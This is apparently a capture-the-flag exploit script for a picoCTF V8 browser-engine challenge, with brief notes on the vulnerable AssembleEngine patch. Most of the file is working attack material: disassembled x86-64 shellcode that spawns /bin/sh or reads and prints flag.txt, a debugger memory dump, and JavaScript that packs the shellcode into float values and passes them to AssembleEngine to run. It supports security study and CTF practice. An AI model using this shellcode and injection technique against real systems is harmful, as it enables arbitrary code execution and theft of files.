/*
First v8 pwned!
picoCTF{vr00m_vr00m_5f29384689d69078} 

Analysis of patch:
Vuln is here - AssembleEngine

By calling AssemblyEngine(array), 
	func[i] = val->Value();
our array values will be copied in func[i].

Then it will be called here:
	void (*foo)() = (void(*)())func;
	foo();


gef➤  x/20gx 0x7ffff7ffb000
0x7ffff7ffb000: 0x3ff199999999999a      0x3ff3333333333333
This are my float values!

0000000000401000 <_start>:
  401000:       48 31 c0                xor    %rax,%rax
  401003:       50                      push   %rax
  401004:       48 b8 2f 2f 62 69 6e    movabs $0x68732f6e69622f2f,%rax
  40100b:       2f 73 68 
  40100e:       50                      push   %rax
  40100f:       48 89 e7                mov    %rsp,%rdi
  401012:       48 31 f6                xor    %rsi,%rsi
  401015:       48 31 d2                xor    %rdx,%rdx
  401018:       48 31 c0                xor    %rax,%rax
  40101b:       b0 3b                   mov    $0x3b,%al
  40101d:       0f 05                   syscall 


000000000401000 <_start>:
  401000:       e8 09 00 00 00          callq  40100e <_readfile>

0000000000401005 <path>:
  401005:       66 6c                   data16 insb (%dx),%es:(%rdi)
  401007:       61                      (bad)  
  401008:       67 2e 74 78             addr32 je,pn 401084 <_push_filename+0x3b>
  40100c:       74 00                   je     40100e <_readfile>

000000000040100e <_readfile>:
  40100e:       5f                      pop    %rdi
  40100f:       48 31 c0                xor    %rax,%rax
  401012:       04 02                   add    $0x2,%al
  401014:       48 31 f6                xor    %rsi,%rsi
  401017:       0f 05                   syscall 
  401019:       66 81 ec ff 0f          sub    $0xfff,%sp
  40101e:       48 8d 34 24             lea    (%rsp),%rsi
  401022:       48 89 c7                mov    %rax,%rdi
  401025:       48 31 d2                xor    %rdx,%rdx
  401028:       66 ba ff 0f             mov    $0xfff,%dx

  40102c:       48 31 c0                xor    %rax,%rax
  40102f:       0f 05                   syscall 

### write syscall
  401031:       48 31 ff                xor    %rdi,%rdi
  401034:       40 80 c7 01             add    $0x1,%dil

  401038:       48 89 c2                mov    %rax,%rdx
  40103b:       48 31 c0                xor    %rax,%rax
  40103e:       04 01                   add    $0x1,%al

  401040:       0f 05                   syscall 
  401042:       48 31 c0                xor    %rax,%rax
  401045:       04 3c                   add    $0x3c,%al

  401047:       0f 05                   syscall 

flag.txt 66 6c 61 67 2e 74 78 74
*/


/// Helper functions to convert between float and integer primitives
//from faith
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

//var float_a = itof(BigInt(0xCCCCCCCCCCCCCCCCCCCC))
/*
var part1 = 9.599820636749996e+80 //xor rax, rax; push rax
var part2 = 1.40050710208528e+195
var part3 = -1.4437836497158448e-37
var part4 = -2.126082850431963e+261
var part5 = 3.5619989634360435e-21
var part6 = 2.6533580168453524e-284
var a = [-6.828527034422786e-229, part1, part3, part2, part4, part5, part6, -9.255963134931783e+61, -9.255963134931783e+61,-9.255963134931783e+61 ];
*/
//	61672E747874B848 9090909090907478

var part1 = 9.599820636749996e+80 //xor rax, rax; push rax

var part2 = -1.695821650481531e-231

var readfile_1 = -6.827718336851389e-229
var readfile_2 = -7.761947293663743e-228
var readfile_3 = -2.5763740026661102e-231
var readfile_4 = -6.827649533706928e-229

var writefile_1 = -1.431489014305655e-231
var writefile_2 = 9.456016559818364e-304
//var writefile_3 = -1.8047169797148526e-230
var writefile_3 = -2848394305474273000
var writefile_4 = -6.828527034370483e-229

//-9.255963134931783e+61 breakpoints
//-6.828527034422786e-229 nops
var a = [-6.828527034422786e-229, part1, 4.3536618755465196e+251, -6.828527034412253e-229, -6.82852917140367e-229, -6.934206657065332e-229, part2, readfile_1,readfile_2,readfile_3,readfile_4, writefile_1, writefile_2, writefile_3, writefile_4, -9.255963134931783e+61 ]


AssembleEngine(a)


